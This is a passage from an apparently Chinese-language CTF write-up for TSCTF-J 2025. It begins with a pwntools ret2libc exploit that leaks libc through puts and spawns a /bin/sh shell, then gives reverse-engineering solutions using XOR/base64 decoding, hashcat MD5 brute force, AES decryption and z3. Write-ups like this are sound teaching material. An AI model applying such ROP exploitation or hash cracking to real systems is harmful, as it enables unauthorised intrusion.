class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>, os=<span class=\"string\">&#x27;linux&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got = <span class=\"number\">0x601018</span></span><br><span class=\"line\">leak_addr = <span class=\"number\">0x400633</span></span><br><span class=\"line\">edi_ret = <span class=\"number\">0x400713</span></span><br><span class=\"line\">ret_only = <span class=\"number\">0x4004c9</span></span><br><span class=\"line\">rbp = <span class=\"number\">0x601090</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = gdb.debug(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;time!\\n&#x27;</span>,</span><br><span class=\"line\">cyclic(<span class=\"number\">0x10</span>)+p64(rbp)+p64(edi_ret)+p64(puts_got)+p64(leak_addr)+<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_real = u64(io.recv(<span class=\"number\">8</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;0&#x27;</span>))</span><br><span class=\"line\">log.debug(<span class=\"string\">f&#x27;puts addr: <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(puts_real)&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_to_real = <span class=\"keyword\">lambda</span> x: x - libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>] + puts_real</span><br><span class=\"line\">log.debug(<span class=\"string\">f&#x27;Libc base: <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(libc_to_real(<span class=\"number\">0</span>))&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">system_real = libc_to_real(libc.sym[<span class=\"string\">&#x27;system&#x27;</span>])</span><br><span class=\"line\">bin_sh_real = libc_to_real(<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(cyclic(<span class=\"number\">0x10</span>)+p64(rbp)+p64(edi_ret)+p64(bin_sh_real)+p64(ret_only)+p64(system_real)+<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><box style=\"opacity: 0.6;\">PLACEHOLDER{I_d0nt_kNovv}</box></p>\n<p><del>对了，因为卡这题了，所以后面的pwn都没有看了</del></p>\n<h2 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h2><h3 id=\"re-Singin\"><a href=\"#re-Singin\" class=\"headerlink\" title=\"[re] Singin\"></a>[re] Singin</h3><p>先静态分析（下面一些函数是我自己命名的）</p>\n<p>首先，看到核心逻辑，Buf2是目标，Buf1是加密输出，进do_something看看</p>\n<p><img src=\"/image-37.png\" alt=\"alt text\"></p>\n<p><img src=\"/image-38.png\" alt=\"alt text\"></p>\n<p>这里是一个异或加密，进b64e</p>\n<p><img src=\"/image-39.png\" alt=\"alt text\"></p>\n<p>一个”标准”的base64，但是有一个奇怪的函数，进change_charset</p>\n<p><img src=\"/image-40.png\" alt=\"alt text\"></p>\n<p>啊哈！这里把标准的字符集改掉了！所以这是一个自定义的base64，下面提取相关数据，因为我比较懒，就运行提取一下啦~</p>\n<p><img src=\"/image-41.png\" alt=\"alt text\"></p>\n<p>↑Buf2的值</p>\n<p>变换后的key<br>↓</p>\n<p><img src=\"/image-42.png\" alt=\"alt text\"></p>\n<p>上代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">buf2 = [<span class=\"number\">0x23</span>,<span class=\"number\">0x7C</span>,<span class=\"number\">0x34</span>,<span class=\"number\">0x61</span>,<span class=\"number\">0x32</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x13</span>,<span class=\"number\">0x3D</span>,<span class=\"number\">0x67</span>,<span class=\"number\">0x12</span>,<span class=\"number\">0x64</span>,<span class=\"number\">0xD</span>,<span class=\"number\">0x37</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x34</span>,<span class=\"number\">0x14</span>,<span class=\"number\">0x3</span>,<span class=\"number\">0x7A</span>,<span class=\"number\">0x2B</span>,<span class=\"number\">0x69</span>,<span class=\"number\">0x24</span>,<span class=\"number\">0x70</span>,<span class=\"number\">0x34</span>,<span class=\"number\">0x61</span>,<span class=\"number\">0x32</span>,<span class=\"number\">0x70</span>,<span class=\"number\">0x6B</span>,<span class=\"number\">0x76</span>,<span class=\"number\">0x2</span>,<span class=\"number\">0x42</span>,<span class=\"number\">0x28</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&#x27;w/w5t/YF0wUnwoQKwJt=&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">chr</span>(c^<span class=\"built_in\">ord</span>(key[i%<span class=\"built_in\">len</span>(key)])) <span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(buf2)]))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-43.png\" alt=\"alt text\"></p>\n<p><box>TSCTF-J{We1c@me_t0_TS_CTF_2025}</box></p>\n<h3 id=\"re-听绿的秘密\"><a href=\"#re-听绿的秘密\" class=\"headerlink\" title=\"[re] 听绿的秘密\"></a>[re] 听绿的秘密</h3><p>看了题目描述，还以为是苹果逆向，吓死了</p>\n<p>这道题考的是Java的自定义加载class</p>\n<p>先用Jadx打开，发现自定义加载了一个类，而主逻辑很可能就在这个类里面，所以第一步是恢复Secret类</p>\n<p><img src=\"/image-44.png\" alt=\"alt text\"></p>\n<p>看到上面的CustomClassLoader的定义</p>\n<p><img src=\"/image-45.png\" alt=\"alt text\"></p>\n<p>解密操作是给原文件里面的字节减7，先提取Secret.obf，下面用python完成解密</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Secret.class&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>).write(<span class=\"built_in\">bytes</span>((v - <span class=\"number\">7</span>)%<span class=\"number\">256</span> <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Secret.obf&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>).read()))</span><br></pre></td></tr></table></figure>\n\n<p>接下来就用jadx打开还原的Secret.class，就能看到图片加密的逻辑了，然后就是解密图片</p>\n<p><img src=\"/image-46.png\" alt=\"alt text\"></p>\n<p>下面给出解密脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Where_is_my_cat.png&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>).read()</span><br><span class=\"line\">cat = <span class=\"built_in\">bytearray</span>(content)</span><br><span class=\"line\">i2 = <span class=\"number\">123</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i3 <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(content)):</span><br><span class=\"line\">    i7 = content[i3]</span><br><span class=\"line\">    i = i7</span><br><span class=\"line\">    i5 = (i3+i2)%<span class=\"number\">8</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i5:</span><br><span class=\"line\">        i6 = ((i&gt;&gt;i5)|(i&lt;&lt;(<span class=\"number\">8</span>-i5))) &amp; <span class=\"number\">255</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        i6 = i</span><br><span class=\"line\">    i4 = (i6 - i2 - i3 % <span class=\"number\">251</span>) % <span class=\"number\">256</span></span><br><span class=\"line\">    i2 = (i2 + i7 + <span class=\"number\">37</span>) &amp; <span class=\"number\">255</span></span><br><span class=\"line\">    cat[i3] = i4</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Cat.png&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>).write(cat)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-47.png\" alt=\"alt text\"></p>\n<p>获得flag</p>\n<p><box>TSCTF-J{181_c3ntimeTer5?}</box></p>\n<h3 id=\"re-CryDancing\"><a href=\"#re-CryDancing\" class=\"headerlink\" title=\"[re] CryDancing\"></a>[re] CryDancing</h3><p>苹果逆向终究还是来了吗……</p>\n<p>上次在哪里的ipa逆向连可执行文件都没找到😅，这次总算找到了，先静态分析</p>\n<p><img src=\"/image-48.png\" alt=\"alt text\"></p>\n<p>从strings里面找到可能相关的字符串，进到了核心逻辑，大概就是把输入（obj）进行加密（YouCanSeeThisRight），然后与目标字符串对比，下面进到加密函数</p>\n<p><img src=\"/image-49.png\" alt=\"alt text\"></p>\n<p>这里先执行GetKey函数，然后把它重复四遍作为下面CCCrypt的密钥，经过搜索，这个应该是AES，用的是CBC模式，iv是375（小端），然后进到GetKey函数</p>\n<p><img src=\"/image-50.png\" alt=\"alt text\"></p>\n<p>反编出来的代码奇奇怪怪的，不过关键的是：这个函数返回四个大写字母，并且返回值的MD5是已知的，所以直接爆破</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat -a 3 -m 0 674040176a34f6c994003fe85badfc48 ?u?u?u?u</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-51.png\" alt=\"alt text\"></p>\n<p>得到返回值：NOTD，也就是说，key就是NOTDNOTDNOTDNOTD</p>\n<p>下面用python恢复flag</p>\n<p><img src=\"/image-52.png\" alt=\"alt text\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"></span><br><span class=\"line\">cipher = AES.new(<span class=\"string\">b&#x27;NOTDNOTDNOTDNOTD&#x27;</span>, AES.MODE_CBC, iv=(<span class=\"number\">375</span>).to_bytes(<span class=\"number\">16</span>, <span class=\"string\">&#x27;little&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(cipher.decrypt(base64.b64decode(<span class=\"string\">&#x27;bvOaEEh1F5pDkMpM6n5src+Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g==&#x27;</span>)))</span><br></pre></td></tr></table></figure>\n\n<p>得到flag</p>\n<p><box>TSCTF-J{S0rry_th3_4nswer_h4s_n0thing_2_do_with_l7rics}</box></p>\n<h3 id=\"re-哭泣之子\"><a href=\"#re-哭泣之子\" class=\"headerlink\" title=\"[re] 哭泣之子\"></a>[re] 哭泣之子</h3><p>这是什么新型的阴乐播放器吗（突然想起来传说中的O泡果奶病毒）</p>\n<p>拿到附件，发现这是一个.Net程序，用dnSpy打开，没有发现加密逻辑，然后就进行调试</p>\n<p><img src=\"/image-53.png\" alt=\"alt text\"></p>\n<p>在输出里发现了一行报错：找不到文件flag，那就肯定是核心逻辑了，在对应异常上下断点（调试-&gt;窗口-&gt;异常设置）</p>\n<p><img src=\"/image-54.png\" alt=\"alt text\"></p>\n<p>之后成功停下，再沿着调用堆栈往回翻，发现加密逻辑</p>\n<p><img src=\"/image-55.png\" alt=\"alt text\"></p>\n<p>接下来就是解密啦~</p>\n<p>因为这个不好直接解密（实际上也无法直接解密），所以使用z3求解，下面给出代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> z3</span><br><span class=\"line\">array3 = [<span class=\"number\">871</span>, <span class=\"number\">1654</span>, <span class=\"number\">789</span>, <span class=\"number\">1617</span>, <span class=\"number\">1221</span>, <span class=\"number\">2173</span>, <span class=\"number\">871</span>, <span class=\"number\">1724</span>, <span class=\"number\">629</span>, <span class=\"number\">1111</span>, <span class=\"number\">789</span>,</span><br><span class=\"line\"><span class=\"number\">1664</span>, <span class=\"number\">783</span>, <span class=\"number\">1579</span>, <span class=\"number\">989</span>, <span class=\"number\">1633</span>, <span class=\"number\">1229</span>, <span class=\"number\">2148</span>, <span class=\"number\">891</span>, <span class=\"number\">1703</span>, <span class=\"number\">1237</span>, <span class=\"number\">2249</span>, <span class=\"number\">1229</span>,</span><br><span class=\"line\"><span class=\"number\">2161</span>, <span class=\"number\">1157</span>, <span class=\"number\">2095</span>, <span class=\"number\">1237</span>, <span class=\"number\">2201</span>, <span class=\"number\">1243</span>, <span class=\"number\">2166</span>, <span class=\"number\">789</span>, <span class=\"number\">1604</span>, <span class=\"number\">941</span>, <span class=\"number\">1669</span>, <span class=\"number\">813</span>,</span><br><span class=\"line\"><span class=\"number\">1651</span>, <span class=\"number\">845</span>, <span class=\"number\">1633</span>, <span class=\"number\">807</span>, <span class=\"number\">1645</span>, <span class=\"number\">941</span>, <span class=\"number\">1673</span>, <span class=\"number\">971</span>, <span class=\"number\">1863</span>, <span class=\"number\">941</span>, <span class=\"number\">1648</span>, <span class=\"number\">789</span>, <span class=\"number\">1620</span>,</span><br><span class=\"line\"><span class=\"number\">941</span>, <span class=\"number\">1659</span>, <span class=\"number\">1255</span>, <span class=\"number\">2157</span>, <span class=\"number\">1167</span>, <span class=\"number\">2121</span>, <span class=\"number\">941</span>, <span class=\"number\">1647</span>, <span class=\"number\">807</span>, <span class=\"number\">1662</span>, <span class=\"number\">845</span>, <span class=\"number\">1634</span>,</span><br><span class=\"line\"><span class=\"number\">1243</span>, <span class=\"number\">2165</span>, <span class=\"number\">813</span>, <span class=\"number\">1650</span>, <span class=\"number\">941</span>, <span class=\"number\">1676</span>, <span class=\"number\">813</span>, <span class=\"number\">1697</span>, <span class=\"number\">783</span>, <span class=\"number\">1589</span>, <span class=\"number\">941</span>, <span class=\"number\">1654</span>, <span class=\"number\">1167</span>,</span><br><span class=\"line\"><span class=\"number\">2097</span>, <span class=\"number\">1255</span>, <span class=\"number\">2157</span>, <span class=\"number\">941</span>, <span class=\"number\">1673</span>, <span class=\"number\">789</span>, <span class=\"number\">1597</span>, <span class=\"number\">941</span>, <span class=\"number\">1655</span>, <span class=\"number\">941</span>, <span class=\"number\">1653</span>, <span class=\"number\">813</span>, <span class=\"number\">1673</span>,</span><br><span class=\"line\"><span class=\"number\">789</span>, <span class=\"number\">1598</span>, <span class=\"number\">891</span>, <span class=\"number\">1735</span>, <span class=\"number\">941</span>, <span class=\"number\">1600</span>, <span class=\"number\">629</span>, <span class=\"number\">1076</span>, <span class=\"number\">891</span>, <span class=\"number\">1728</span>, <span class=\"number\">603</span>, <span class=\"number\">1008</span>, <span class=\"number\">389</span>,</span><br><span class=\"line\"><span class=\"number\">827</span>]</span><br><span class=\"line\">a3o = array3[:]</span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">99</span>, <span class=\"number\">2</span>):</span><br><span class=\"line\">    solver = z3.Solver()</span><br><span class=\"line\">    a2k, a2kp1 = z3.BitVecs(<span class=\"string\">&#x27;a2k a2kp1&#x27;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">    solver.add(a2k&lt;=<span class=\"number\">125</span>)</span><br><span class=\"line\">    solver.add(a2kp1&lt;=<span class=\"number\">125</span>)</span><br><span class=\"line\">    solver.add(a2k&gt;=<span class=\"number\">32</span>)</span><br><span class=\"line\">    solver.add(a2kp1&gt;=<span class=\"number\">32</span>)</span><br><span class=\"line\">    num = a2k &lt;&lt; <span class=\"number\">3</span> ^ <span class=\"number\">83</span></span><br><span class=\"line\">    a2kn = (num + a2k ^ a2k + <span class=\"number\">72</span>)</span><br><span class=\"line\">    a2kp1n = a2kn + (num ^ a2kp1)</span><br><span class=\"line\">    solver.add(a2kn == array3[k])</span><br><span class=\"line\">    solver.add(a2kp1n == array3[k+<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> solver.check() == z3.sat</span><br><span class=\"line\">    array3[k] = solver.model()[a2k].as_long()</span><br><span class=\"line\">    array3[k+<span class=\"number\">1</span>] = solver.model()[a2kp1].as_long()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">bytes</span>(array3))</span><br></pre></td></tr></table></figure>\n\n<p>当然，在没有提示之前，我写的范围是[0, 256)，解出来的flag长这样：</p>\n<p><img src=\"/image-56.png\" alt=\"alt text\"></p>\n<p>里正确答案只剩下两个字符（即一个方程组）了，当时太晚了，没有再想想就睡觉了，早上看到提示后就解出来了</p>\n<p>正确flag：</p>\n<p><box>flag{3f619a0b_Would_you_say_that_someone_who_had_every_intention_to_be_brave_was_a_coward?_81dd64f3}</box></p>\n<p>注：判断完正误是有回显的，程序会修改NAudio.Midi.dll的前几字节</p>\n<p><img src=\"/image-57.png\" alt=\"alt text\"></p>\n<div>\n<img src=\"image-58.png\" style=\"float: right\">\n\n<p>又注：一开始把注意力放到提取阴乐的地方去了，发现还有一张png图片内嵌了（其实就是应用的图标），在这里放出来，吓💩你们<del>（bushi</del></p>\n</div>\n\n<h3 id=\"re-Catbits\"><a href=\"#re-Catbits\" class=\"headerlink\" title=\"[re] Catbits\"></a>[re] Catbits</h3><p>编程猫逆向？什么玩意儿（丢）</p>\n<p>其实这道题没那么难，只是逻辑不太好找而已，真正逆向很简单</p>\n<p>考虑到大家可能都没有学过编程猫（其实我也没学过），从配置环境开始</p>\n<ol>\n<li>安装Scratch</li>\n</ol>\n<p>一般情况我都是在官网下安装包的，奈何官网被ban了，那就从Microsoft Store凑合一下吧</p>\n<p><img src=\"/image-59.png\" alt=\"alt text\"></p>\n<ol start=\"2\">\n<li>打开项目</li>\n</ol>\n<p>启动程序，然后”文件”-&gt;“从电脑中打开”</p>\n<p><img src=\"/image-60.png\" alt=\"alt text\"></p>\n<ol start=\"3\">\n<li>查看代码逻辑</li>\n</ol>\n<p><img src=\"/image-61.png\" alt=\"alt text\"></p>\n<p>额……这有加密逻辑？输入都没找到啊，不会被隐藏了吧……</p>\n<p>如果你有这种想法，那就和我掉进一个坑里了</p>\n<p>我们可以看看.sb3（本质是.zip）里面的project.json，你其实会发现：它的代码是按人物存储的！比如下图，上面的blocks里面存储的就是”角色1”的代码，下面的blocks则是”角色3”的。那我们怎么看其他代码呢？</p>\n<p><img src=\"/image-62.png\" alt=\"alt text\"></p>\n<p>没错，在右边选其他角色就好了</p>\n<p><img src=\"/image-63.png\" alt=\"alt text\"></p>\n<p><img src=\"/image-64.png\" alt=\"alt text\"></p>\n<p>（没错，就是这么简单粗暴）</p>\n<p>接下来就是还原代码逻辑了，不过可能确实有一段逻辑（orc-&gt;arc），通过简单测试，可以恢复，下面是用python重写的逻辑（有一些太啰嗦了，直接改写了，原逻辑被注释了）：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">src = [<span class=\"number\">211</span>, <span class=\"number\">717</span>, <span class=\"number\">210</span>, <span class=\"number\">132</span>, <span class=\"number\">193</span>, <span class=\"number\">114</span>, <span class=\"number\">244</span>, <span class=\"number\">208</span>, <span class=\"number\">213</span>, <span class=\"number\">99</span>, <span class=\"number\">37</span>, <span class=\"number\">214</span>, <span class=\"number\">224</span>, <span class=\"number\">101</span>, <span class=\"number\">98</span>, <span class=\"number\">212</span>, <span class=\"number\">224</span>, <span class=\"number\">118</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 消息1</span></span><br><span class=\"line\">orc = []</span><br><span class=\"line\">arc = []</span><br><span class=\"line\">index = <span class=\"number\">1</span></span><br><span class=\"line\">end = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> end != <span class=\"number\">1</span>:</span><br><span class=\"line\">    answer = <span class=\"built_in\">input</span>()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> answer == <span class=\"string\">&#x27;#&#x27;</span>:</span><br><span class=\"line\">        end = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        orc.append(answer)</span><br><span class=\"line\">        index += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># nonomi</span></span><br><span class=\"line\"><span class=\"comment\"># 没有找到ToKo触发逻辑，根据调试，恢复如下</span></span><br><span class=\"line\">arc = [<span class=\"number\">114</span>] + [<span class=\"built_in\">ord</span>(c)+<span class=\"number\">1</span> <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> orc]</span><br><span class=\"line\"></span><br><span class=\"line\">yindex = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> yindex &lt;= <span class=\"built_in\">len</span>(arc) +<span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"comment\"># Shiroko</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">Bravo</span>(<span class=\"params\">Amy</span>): <span class=\"comment\"># 就是(值+项数)%255</span></span><br><span class=\"line\">        <span class=\"keyword\">global</span> iNdex</span><br><span class=\"line\">        iNdex = yindex</span><br><span class=\"line\">        ij = arc[iNdex-<span class=\"number\">1</span>]</span><br><span class=\"line\">        kl = ij + Amy</span><br><span class=\"line\">        <span class=\"keyword\">if</span> kl &gt; <span class=\"number\">255</span>:</span><br><span class=\"line\">            mn = kl-<span class=\"number\">255</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            mn = kl</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mn</span><br><span class=\"line\">    arc[iNdex-<span class=\"number\">1</span>] = Bravo(yindex)</span><br><span class=\"line\">    yindex += <span class=\"number\">1</span> <span class=\"comment\"># PDF的WP这里好像漏了一行</span></span><br><span class=\"line\"></span><br><span class=\"line\">yindex = <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> yindex &lt;= <span class=\"built_in\">len</span>(arc) +<span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"comment\"># murasame</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">Charlie</span>(<span class=\"params\">Alice, Bob</span>): <span class=\"comment\"># 就是异或</span></span><br><span class=\"line\">        <span class=\"comment\"># ret = 0</span></span><br><span class=\"line\">        <span class=\"comment\"># v1 = round(Alice)</span></span><br><span class=\"line\">        <span class=\"comment\"># v2 = round(Bob)</span></span><br><span class=\"line\">        <span class=\"comment\"># v5 = 1</span></span><br><span class=\"line\">        <span class=\"comment\"># while not (v1 == v2 == 0):</span></span><br><span class=\"line\">        <span class=\"comment\">#     v3 = v1 % 2</span></span><br><span class=\"line\">        <span class=\"comment\">#     v4 = v2 % 2</span></span><br><span class=\"line\">        <span class=\"comment\">#     v6 = (v3+v4) % 2</span></span><br><span class=\"line\">        <span class=\"comment\">#     ret += v5*v6</span></span><br><span class=\"line\">        <span class=\"comment\">#     v1 //= 2</span></span><br><span class=\"line\">        <span class=\"comment\">#     v2 //= 2</span></span><br><span class=\"line\">        <span class=\"comment\">#     v5 *= 2</span></span><br><span class=\"line\">        <span class=\"comment\"># return ret</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> Alice ^ Bob</span><br><span class=\"line\">    arc[yindex-<span class=\"number\">1</span>] = Charlie(arc[yindex-<span class=\"number\">1</span>], arc[yindex-<span class=\"number\">2</span>])</span><br><span class=\"line\">    yindex += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">yindex = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> yindex &lt;= <span class=\"built_in\">len</span>(arc) +<span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"comment\"># abstruse</span></span><br><span class=\"line\">    <span class=\"comment\"># def Delta(Masking):</span></span><br><span class=\"line\">    <span class=\"comment\">#     return Masking % 16 * 16</span></span><br><span class=\"line\">    <span class=\"comment\"># def Echo(Layer):</span></span><br><span class=\"line\">    <span class=\"comment\">#     return Layer // 16</span></span><br><span class=\"line\">    <span class=\"comment\"># def Foxfort(ChuChu, Pareo):</span></span><br><span class=\"line\">    <span class=\"comment\">#     return Charlie(ChuChu, Pareo)</span></span><br><span class=\"line\">    <span class=\"comment\"># arc[yindex-1] = Foxfort(Delta(arc[yindex-1]),Echo(arc[yindex-1]))</span></span><br><span class=\"line\">    tmp = arc[yindex-<span class=\"number\">1</span>]</span><br><span class=\"line\">    arc[yindex-<span class=\"number\">1</span>] = (tmp&gt;&gt;<span class=\"number\">4</span>)|((tmp&amp;<span class=\"number\">0xf</span>)&lt;&lt;<span class=\"number\">4</span>)</span><br><span class=\"line\">    yindex += 